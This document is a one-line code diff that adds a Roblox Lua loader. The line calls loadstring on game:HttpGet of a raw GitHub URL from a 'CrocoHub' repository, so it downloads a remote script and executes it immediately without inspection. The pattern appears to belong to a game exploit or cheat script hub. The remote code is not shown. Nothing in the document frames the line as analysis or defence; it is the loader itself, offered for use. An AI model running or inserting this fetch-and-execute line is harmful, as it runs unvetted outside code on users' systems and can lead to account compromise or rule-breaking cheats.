@@ -1,0 +1,1 @@
+loadstring(game:HttpGet('https://raw.githubusercontent.com/CrocoHub/Croco/refs/heads/main/Croco.lua'))()
